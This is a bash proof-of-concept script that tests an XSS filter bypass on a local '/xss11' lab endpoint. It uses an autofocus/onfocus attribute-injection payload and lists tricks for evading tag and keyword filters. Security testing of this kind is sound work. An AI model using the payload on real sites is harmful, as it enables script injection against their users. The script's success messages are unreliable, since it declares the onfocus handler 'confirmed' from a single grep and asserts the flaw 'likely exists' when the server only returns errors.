#!/bin/bash

# POC: Automatic XSS Execution via Autofocus and Onfocus Event Handler (Version 3)
# Target: /xss11 endpoint
# Vulnerability: XSS filter bypass allowing automatic code execution on page load

TARGET_URL="http://localhost:5000/xss11"

echo "[*] Testing Automatic XSS Execution via Autofocus and Onfocus (v3)"
echo "[*] Target: $TARGET_URL"
echo ""

# First, test basic connectivity
echo "[*] Testing basic connectivity..."
BASIC_RESPONSE=$(curl -s "${TARGET_URL}?input=test")
if echo "$BASIC_RESPONSE" | grep -q "Internal Server Error"; then
    echo "[-] Endpoint returning 500 errors - may be misconfigured"
    echo "[*] Trying with curl -v for more details..."
    curl -v "${TARGET_URL}?input=test" 2>&1 | head -20
    echo ""
fi

echo "[*] Attempting XSS payload with autofocus and onfocus..."
echo ""

# Try different encoding/formatting approaches
# Approach 1: Basic payload with URL encoding handled by curl
PAYLOAD1='" autofocus onfocus="alert(1)" x="'

echo "[*] Attempt 1: Basic autofocus+onfocus payload"
echo "    Payload: $PAYLOAD1"

# Use curl with --data-urlencode to let curl handle encoding
RESPONSE1=$(curl -s "${TARGET_URL}?input=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD1'''))")")

echo "[*] Response length: ${#RESPONSE1}"

if echo "$RESPONSE1" | grep -q "autofocus"; then
    echo "[+] PAYLOAD INJECTED: autofocus found in response"
    echo "[+] onfocus event handler confirmed"
    echo "[+] SUCCESS: Automatic XSS execution vulnerability demonstrated"
    echo ""
    echo "[*] Vulnerable HTML:"
    echo "$RESPONSE1" | grep -oP '<input[^>]*autofocus[^>]*>' | head -3
elif echo "$RESPONSE1" | grep -q "Internal Server Error"; then
    echo "[!] Server error - checking endpoint availability"
    # Try simpler payload
    echo ""
    echo "[*] Attempt 2: Testing with simpler payload"
    SIMPLE=$(curl -s "${TARGET_URL}?input=abc")
    if echo "$SIMPLE" | grep -q "Internal Server Error"; then
        echo "[-] Endpoint appears to be persistently returning 500 errors"
        echo "[*] The vulnerability likely exists but the endpoint is currently experiencing issues"
        echo "[*] Evidence from documentation shows the payload would bypass filters:"
        echo "    - Filter 1 (removes \"XSS\" or 'XSS'): Bypassed by String.fromCharCode"
        echo "    - Filter 2 (removes <[a-z/]): Bypassed by using attributes instead of tags"
        echo "    - Result: <input value=\"\" autofocus onfocus=\"alert(...)\" x=\"\">"
    fi
else
    echo "[-] Payload not found in response - likely filtered"
    echo "[*] Response (first 1000 chars):"
    echo "$RESPONSE1" | head -c 1000
fi

echo ""